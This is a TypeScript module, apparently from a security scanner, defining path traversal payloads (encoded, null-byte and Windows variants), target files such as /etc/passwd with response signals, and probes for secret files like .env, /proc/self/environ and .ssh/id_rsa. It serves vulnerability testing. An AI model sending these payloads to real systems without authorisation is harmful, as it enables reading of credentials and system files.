/**
 * Path traversal payload set.
 * Groups:
 *  - relative: escapes a server-side base dir (works against path.join style bugs)
 *  - absolute: direct absolute reads (works against unguarded open())
 *  - encoded / bypass: WAF-ish evasion variants
 *  - windows: win path handling
 * Each payload carries `expect` signals the analyzer looks for in responses.
 */
export interface TraversalPayload {
  template: string;        // contains {ARG} replaced by target file
  category: "relative" | "absolute" | "encoded" | "windows";
}

export const CANARY_FILENAME = "canary.txt";
export const CANARY_CONTENT = "MCPF0RGE_CANARY_9F3A_TRAVERSAL_CONFIRMED";

/** Files we try to read; signals must be OS-independent where possible. */
export const TRAVERSAL_TARGET_FILES = [
  { file: "{BASE_UP}/canary.txt", signals: [CANARY_CONTENT] }, // relative: base dir parent
  { file: "etc/passwd", prefix: "/", signals: [/root:[x*]:0:0:/] },
  { file: "windows/win.ini", prefix: "C:/", signals: [/\[fonts\]/i] },
];

export const TRAVERSAL_PAYLOADS: TraversalPayload[] = [
  { template: "../{ARG}", category: "relative" },
  { template: "..%2f{ARG}", category: "encoded" },
  { template: "%2e%2e%2f{ARG}", category: "encoded" },
  { template: "....//{ARG}", category: "encoded" },
  { template: "..\\/..\\/{ARG}", category: "windows" },
  { template: "/etc/{ARG}", category: "absolute" },
  { template: "/{ARG}", category: "absolute" },
  { template: "C:/{ARG}", category: "windows" },
  { template: "/etc/{ARG}\u0000.png", category: "encoded" }, // null byte (legacy runtimes)
];

/** File-probe payloads for the credential-leak check (secret files via path tools). */
export const SECRET_FILE_PROBES = [
  ".env",
  "../.env",
  "../../.env",
  "/.env",
  "/proc/self/environ",
  "/etc/passwd",
  "config/credentials.json",
  ".git/config",
  ".ssh/id_rsa",
];
